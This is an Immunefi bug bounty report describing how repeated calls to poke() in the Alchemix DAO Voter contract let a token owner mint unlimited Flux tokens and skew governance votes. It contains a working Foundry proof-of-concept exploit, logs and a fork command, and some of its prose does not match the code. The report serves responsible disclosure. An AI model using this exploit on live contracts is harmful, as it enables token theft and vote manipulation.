# 31149 - \[SC - Critical] Manipulation of governance voting result by unl...

## Manipulation of governance voting result by unlimited minting the Flux Token by repeatly call poke function

Submitted on May 13th 2024 at 16:06:32 UTC by @perseverance for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31149

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

### Description

## Description

### Brief/Intro

Flux token implements a standard ERC20 token with extra features. Flux tokens are accrued by users of VotingEscrow when voting in the contract Voter. Flux tokens can be used to: i) exit a ve-position early by paying a penalty fee when calling function startCooldown, ii) boost voting power of a NFT holder in contract Voter, or iii) as a normal ERC20 token that can be traded in other systems.

So Flux tokens can be used to boost the voting power of a NFT holder. It is shown in the code of vote() function as below.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L228C5-L233C6>

```solidity
function vote(
        uint256 _tokenId,
        address[] calldata _poolVote,
        uint256[] calldata _weights,
        uint256 _boost
    ) external onlyNewEpoch(_tokenId) { {

        // redacted for simplicity

    }
    _vote(_tokenId, _poolVote, _weights, _boost);

```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L412-L455>

```solidity
function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
        
        
        // redacted for simplicity

        IFluxToken(FLUX).accrueFlux(_tokenId);
        uint256 totalPower = (IVotingEscrow(veALCX).balanceOfToken(_tokenId) + _boost);

    
        // redacted for simplicity
       
        // Update flux balance of token if boost was used
        if (_boost > 0) {
            IFluxToken(FLUX).updateFlux(_tokenId, _boost);
        }
    }
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol#L195-L199>

```solidity
    function updateFlux(uint256 _tokenId, uint256 _amount) external {
        require(msg.sender == voter, "not voter");
        require(_amount <= unclaimedFlux[_tokenId], "not enough flux");
        unclaimedFlux[_tokenId] -= _amount;
    }

```

So users can boost the voting power up to unclaimedFlux of the tokenId.

The unclaimedFlux\[\_tokenId] is updated in the function accrueFlux()

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol#L188C5-L192C6>

```solidity
function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
    }
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L377-L385>

```solidity
function claimableFlux(uint256 _tokenId) public view returns (uint256) {
        // If the lock is expired, no flux is claimable at the current epoch
        if (block.timestamp > locked[_tokenId].end) {
            return 0;
        }

        // Amount of flux claimable is <fluxPerVeALCX> percent of the balance
        return (_balanceOfTokenAt(_tokenId, block.timestamp) * fluxPerVeALCX) / BPS;
    }
```

So according to the design of the Alchemix DAO system, if an user have a locked tokenID then with balanceA then the user can get maximum Fluxtoken for 1 epoch is

```solidity
    _balanceOfTokenAt(_tokenId, block.timestamp)* fluxPerVeALCX) / BPS 
```

### The vulnerability

#### Vulnerability Details

Now an attacker can mint unlimited times of the amount of Flux Token for 1 epoch intended by the Alchemix DAO system by the using the same amount of capital.

So if an user have locked 10 \* 10 \*\* 18 BPT token for 2 weeks, then the maximal amount of flux tokens can be claimed in 1 epoch is:

270057394723366387 = 270\_057\_394\_723\_366\_387 = 270 e15 Flux token.

This amount here is just an example.

Attacker can manipulate the system to mint unlimited times of Flux token by exploiting the function poke() in Voter contract.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L195-L212>

```solidity
    function poke(uint256 _tokenId) public {
        // Previous boost will be taken into account with weights being pulled from the votes mapping
        uint256 _boost = 0;

        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        address[] memory _poolVote = poolVote[_tokenId];
        uint256 _poolCnt = _poolVote.length;
        uint256[] memory _weights = new uint256[](_poolCnt);

        for (uint256 i = 0; i < _poolCnt; i++) {
            _weights[i] = votes[_tokenId][_poolVote[i]];
        }

        _vote(_tokenId, _poolVote, _weights, _boost);
    }
```

This function call will call \_vote() internal function then call accrueFlux function of contract FluxToken

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L412-L423>

```solidity
function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
        
        // redacted for simplicity
        IFluxToken(FLUX).accrueFlux(_tokenId);

        // redacted for simplicity
    }

```

Since the attacker is the owner of tokenId so this is normal. This call will call accrueFlux function to update the unclaimedFlux for the tokenId.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol#L188C5-L192C6>

```solidity
function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
    }
```

Now this tokenId1 has the balanceTokenId1 => unclaimedFlux\[\_tokenId] += amount

Since the poke() function allows the owner of the tokenId to call this function unlimited times during the same EPOCH. Every time the poke() function is called, then the unclaimedFlux is added one more time.

```solidity
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
```

By repeatedly call poke() function, the attacker will get more Flux token unlimited times of the current intended amount. When have more flux token, the attacker can use it as boost to manipulate the system to manipulate governance.

## Impacts

## About the severity assessment

The impact is that the attacker will be able to exploit the system to get unlimited times bigger Flux token for the same capital.

Since the Flux tokens can be used to boost the Voting power in Vote function and can manipulate the governance voting result. The attacker can also mint Flux token to get benefit as the Flux token can be traded for other assets as stated by the protocol document.

The severity: Critial

Category:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
* Unauthorized or malicious minting of Flux token

Capital for the attack: Gas to execute the transactions.\
Amount of BPT can be small just to create lock position.

Easy to exploit and easy to be automated.

Please note that this bug is different from bug: Report 39030 (<https://bugs.immunefi.com/dashboard/submission/39030>) was reported by me. Because the bug 39030 describes the exploit using poke() and merge() function. The attack there is more complex and related to merge() functionality. For bug 39030, the attacker can mint only several times of the amount of Flux token.

This bug involves only exploit of poke() function. For this bug the attacker can mint unlimited amount of Flux token.

### Proof of concept

## Proof of concept

### testFluxAccrual\_Poke\_Hacked()

I created the POC for exploit scenario

The POC code:

```solidity
function testFluxAccrual_Poke_Hacked() public {
        
        address attacker = address(this); 
        console2.log("Start to createLock with _maxLockEnabled is false and value is 1e18 BPT");

        uint256 tokenId1 = createVeAlcx(attacker, 10*TOKEN_1, 2 weeks, false);
                
        IVotingEscrow_1.LockedBalance memory _lock = IVotingEscrow_1(address(veALCX)).locked(tokenId1);
        console2.log("LockedBalance of tokenId1 lock.amount: %s  ", _lock.amount);
        console2.log("LockedBalance of tokenId1 _lock.end: %s  ", _lock.end);  
        console2.log("LockedBalance of tokenId1 _lock.cooldown: %s  ", _lock.end); 
        console2.log("LockedBalance of tokenId1 _lock.maxLockEnabled: %s  ", _lock.maxLockEnabled); 
        
        console2.log("Call voter.poke(tokenId1)");
        
        uint256 count = 11000; 

        for (uint256 i = 0; i < count; ++i)
        {
            voter.poke(tokenId1);                       
        
        }
        
        console2.log("After having unclaimFlux, attacker can use to boost voting power or mint Flux token"); 

        console2.log("Flux token balance of the attacker: %s",flux.balanceOf(attacker)); 
        console2.log("Call unclaimedFlux to mint Flux token for the attacker"); 
        uint256 unclaimedFlux = flux.getUnclaimedFlux(tokenId1);
        flux.claimFlux(tokenId1,unclaimedFlux); 
        console2.log("After claiming: Flux token balance of the attacker: %s",flux.balanceOf(attacker));

}
```

In this POC, I use 10 \* 10\*\*18 BPT token. The attacker create 10 tokenIds and repeately call poke(tokenId) and merge

The log shows:

```
[PASS] testFluxAccrual_Poke_Hacked() (gas: 175256241)
Logs:
  Start to createLock with _maxLockEnabled is false and value is 1e18 BPT
  LockedBalance of tokenId1 lock.amount: 10000000000000000000  
  LockedBalance of tokenId1 _lock.end: 1716422400  
  LockedBalance of tokenId1 _lock.cooldown: 1716422400  
  LockedBalance of tokenId1 _lock.maxLockEnabled: false  
  Call voter.poke(tokenId1)
  After having unclaimFlux, attacker can use to boost voting power or mint Flux token
  Flux token balance of the attacker: 0
  Call unclaimedFlux to mint Flux token for the attacker
  After claiming: Flux token balance of the attacker: 2970631341957030257000

```

So at the end of the attack: the attacker still have a tokenId with amount: 10000000000000000000 = 10 \*\* 18 Lock duration: 2 weeks.

So the attacker still can withdraw his capital of BPT token as normal.

The unclaimedFlux of tokenId1: 2970631341957030257000

### testFluxAccrual\_Poke\_Normal()

I also created the normal scenario where a user lock 10 \*\* 10\*\*18 BPT token.

```solidity
function testFluxAccrual_Poke_Normal() public {
        
        address attacker = address(this); 
        console2.log("Start to createLock with _maxLockEnabled is false and value is 1e18 BPT");

        uint256 tokenId1 = createVeAlcx(attacker, 10*TOKEN_1, 2 weeks, false);
                
        IVotingEscrow_1.LockedBalance memory _lock = IVotingEscrow_1(address(veALCX)).locked(tokenId1);
        console2.log("LockedBalance of tokenId1 lock.amount: %s  ", _lock.amount);
        console2.log("LockedBalance of tokenId1 _lock.end: %s  ", _lock.end);  
        console2.log("LockedBalance of tokenId1 _lock.cooldown: %s  ", _lock.end); 
        console2.log("LockedBalance of tokenId1 _lock.maxLockEnabled: %s  ", _lock.maxLockEnabled); 
        
        console2.log("Call voter.poke(tokenId1)");          
        voter.poke(tokenId1);
        uint256 unclaimedFlux = flux.getUnclaimedFlux(tokenId1);
        console2.log("unclaimedFlux1: %s", unclaimedFlux);

        console2.log("After having unclaimFlux, attacker can use to boost voting power or mint Flux token"); 

        console2.log("Flux token balance of the attacker: %s",flux.balanceOf(attacker)); 
        console2.log("Call unclaimedFlux to mint Flux token for the attacker"); 
        flux.claimFlux(tokenId1,unclaimedFlux); 
        console2.log("After claiming: Flux token balance of the attacker: %s",flux.balanceOf(attacker));
             

    }
```

The log of this test case shows:

```

[PASS] testFluxAccrual_Poke_Normal() (gas: 1296670)
Logs:
  Start to createLock with _maxLockEnabled is false and value is 1e18 BPT
  LockedBalance of tokenId1 lock.amount: 10000000000000000000  
  LockedBalance of tokenId1 _lock.end: 1716422400  
  LockedBalance of tokenId1 _lock.cooldown: 1716422400  
  LockedBalance of tokenId1 _lock.maxLockEnabled: false  
  Call voter.poke(tokenId1)
  unclaimedFlux1: 270057394723366387
  After having unclaimFlux, attacker can use to boost voting power or mint Flux token
  Flux token balance of the attacker: 0
  Call unclaimedFlux to mint Flux token for the attacker
  After claiming: Flux token balance of the attacker: 270057394723366387 


```

So the unclaimedFlux1 of the tokenID1 is 270057394723366387

To compare, the attacker get 11\_000 times bigger that is the number of loops. So attackers can repeat this and get the unlimited token of Flux token.

```
2970631341957030257000  /  270057394723366387  = 11_000 
```

So attacker can use the gained Flux token to boost the voting power.\
In this POC, I demonstrated that the attacker can mint Flux token.

```
   Flux token balance of the attacker: 0
  Call unclaimedFlux to mint Flux token for the attacker
  After claiming: Flux token balance of the attacker: 2970631341957030257000

```

### Full POC Code:

To run the test Copy the test code into the file:

```solidity
function testFluxAccrual_Poke_Hacked() public {
        
        address attacker = address(this); 
        console2.log("Start to createLock with _maxLockEnabled is false and value is 1e18 BPT");

        uint256 tokenId1 = createVeAlcx(attacker, 10*TOKEN_1, 2 weeks, false);
                
        IVotingEscrow_1.LockedBalance memory _lock = IVotingEscrow_1(address(veALCX)).locked(tokenId1);
        console2.log("LockedBalance of tokenId1 lock.amount: %s  ", _lock.amount);
        console2.log("LockedBalance of tokenId1 _lock.end: %s  ", _lock.end);  
        console2.log("LockedBalance of tokenId1 _lock.cooldown: %s  ", _lock.end); 
        console2.log("LockedBalance of tokenId1 _lock.maxLockEnabled: %s  ", _lock.maxLockEnabled); 
        
        console2.log("Call voter.poke(tokenId1)");
        
        uint256 count = 11000; 

        for (uint256 i = 0; i < count; ++i)
        {
            voter.poke(tokenId1);                       
        
        }
        
        console2.log("After having unclaimFlux, attacker can use to boost voting power or mint Flux token"); 

        console2.log("Flux token balance of the attacker: %s",flux.balanceOf(attacker)); 
        console2.log("Call unclaimedFlux to mint Flux token for the attacker"); 
        uint256 unclaimedFlux = flux.getUnclaimedFlux(tokenId1);
        flux.claimFlux(tokenId1,unclaimedFlux); 
        console2.log("After claiming: Flux token balance of the attacker: %s",flux.balanceOf(attacker));

    }

    function testFluxAccrual_Poke_Normal() public {
        
        address attacker = address(this); 
        console2.log("Start to createLock with _maxLockEnabled is false and value is 1e18 BPT");

        uint256 tokenId1 = createVeAlcx(attacker, 10*TOKEN_1, 2 weeks, false);
                
        IVotingEscrow_1.LockedBalance memory _lock = IVotingEscrow_1(address(veALCX)).locked(tokenId1);
        console2.log("LockedBalance of tokenId1 lock.amount: %s  ", _lock.amount);
        console2.log("LockedBalance of tokenId1 _lock.end: %s  ", _lock.end);  
        console2.log("LockedBalance of tokenId1 _lock.cooldown: %s  ", _lock.end); 
        console2.log("LockedBalance of tokenId1 _lock.maxLockEnabled: %s  ", _lock.maxLockEnabled); 
        
        console2.log("Call voter.poke(tokenId1)");          
        voter.poke(tokenId1);
        uint256 unclaimedFlux = flux.getUnclaimedFlux(tokenId1);
        console2.log("unclaimedFlux1: %s", unclaimedFlux);

        console2.log("After having unclaimFlux, attacker can use to boost voting power or mint Flux token"); 

        console2.log("Flux token balance of the attacker: %s",flux.balanceOf(attacker)); 
        console2.log("Call unclaimedFlux to mint Flux token for the attacker"); 
        flux.claimFlux(tokenId1,unclaimedFlux); 
        console2.log("After claiming: Flux token balance of the attacker: %s",flux.balanceOf(attacker));
             

    }

} 


```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/test/VotingEscrow.t.sol>

and run the test command for the function in the alchemix-v2-dao folder:

```
FOUNDRY_PROFILE=default forge test --fork-url https://rpc.ankr.com/eth --match-path src/test/VotingEscrow.t.sol --match-test testFluxAccrual_Poke  --fork-block-number 19858400 -vvvvv | format > testFluxAccrual_Poke_240513_1000.log 

```

### Logs

* The full log: <https://drive.google.com/file/d/1rVgRlD\\_C4NYKynFeBBv-YcVG8G90q-Fc/view?usp=sharing>
* The full log file with debug:

<https://drive.google.com/file/d/1BGhCmiM-gADnQcNgvfbnDVhbDrs7oIAN/view?usp=sharing>
